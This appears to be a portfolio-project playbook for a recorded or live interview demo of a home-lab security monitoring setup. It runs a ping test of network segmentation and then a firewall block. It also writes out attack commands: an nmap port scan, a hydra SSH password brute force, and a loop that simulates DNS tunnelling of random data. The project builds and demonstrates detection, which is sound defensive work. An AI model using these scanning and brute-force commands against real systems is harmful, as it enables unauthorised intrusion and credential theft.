# The 3-Minute Demo Playbook

This is the exact sequence to record as a video **and** to perform live in an
interview. Keep it under 3-4 minutes. Practise it 5 times until it's smooth.

## Before you start (have these open)

- Terminal on **Kali** (the attacker)
- Terminal on the **Pi**: `tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'`
- Browser on **Grafana** (`http://<pi-ip>:3000`), the *SecureHome SOC* dashboard
- Optional: **Wireshark** capturing on the Pi's monitor interface

## Script

### 0:00 — One-sentence intro
> "This is SecureHome SOC — a segmented network I built on a laptop and a
> Raspberry Pi, where I attack my own network and detect it in real time."

### 0:20 — Prove segmentation works
From the IoT device (or Kali pretending to be IoT), try to reach the server:
```bash
ping 10.10.20.100      # from IoT VLAN 30 -> should FAIL (ACL blocks it)
```
> "IoT can reach the internet but **not** my servers — enforced by an ACL on the
> core switch. That's network segmentation, the #1 control that limits a breach."

### 0:50 — Attack 1: recon
```bash
nmap -sS -p- 10.10.20.100
```
> "First thing an attacker does is scan. Watch the dashboard."
Point to Grafana: the *Nmap SYN scan* alert appears. Explain SYN-only packets.

### 1:30 — Attack 2: brute force
```bash
hydra -l labuser -P wordlist.txt ssh://10.10.20.100 -t 4
```
> "Now a password brute force on SSH." The *SSH brute-force* alert fires.
Then **respond**:
```bash
sudo nft add element inet filter blocklist_v4 { 10.10.10.100 }
```
> "I block the attacker at the firewall — detection **and** response."

### 2:20 — Attack 3: DNS tunnel (the finale)
```bash
for i in $(seq 1 60); do dig $(head -c 80 /dev/urandom | base64 | tr -d '/+=' | head -c 70).example.com TXT +short; done
```
> "This hides data inside DNS — invisible to a normal firewall. My custom rule
> catches the abnormal query length and volume." The DNS-tunnel alerts fire.

### 2:50 — Close with a packet
Show one alert in Wireshark; point at the TCP flags / DNS query name.
> "Every alert, I can explain down to the packet and the OSI layer. Thanks."

## Recording tips

- Use OBS Studio (free). 1080p, show your terminals + browser.
- Add 3-4 on-screen captions ("Segmentation", "Recon detected", etc.).
- Keep your voice calm; the content is impressive on its own.
- Upload unlisted to YouTube; put the link at the top of the README and your CV.
